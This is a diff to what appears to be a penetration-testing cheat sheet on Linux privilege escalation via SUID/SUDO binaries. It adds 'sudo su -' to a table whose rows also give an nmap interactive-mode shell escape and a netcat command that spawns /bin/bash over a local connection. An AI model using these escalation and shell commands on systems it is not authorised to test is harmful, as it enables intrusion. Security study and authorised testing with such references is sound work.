@@ -39,7 +39,7 @@ If any of the following commands appear on the list of SUID or SUDO commands, th
 
 | SUID / SUDO Executables               | Priv Esc Command (will need to prefix with sudo if you are using sudo for priv esc. |
 |---------------------------------------|-------------------------------------------------------------------------------------|
-| (ALL : ALL ) ALL                      | You can run any command as root.<br> sudo /bin/bash                                 |
+| (ALL : ALL ) ALL                      | You can run any command as root.<br>sudo su - <br>sudo /bin/bash                                 |
 | nmap<br>(older versions 2.02 to 5.21) | nmap --interactive<br>!sh                                                           |
 | netcat<br>nc<br>nc.traditional        | nc -nlvp 4444 &<br> nc -e /bin/bash 127.0.0.1 4444                                  |
 | ncat                                  |                                                                                     |
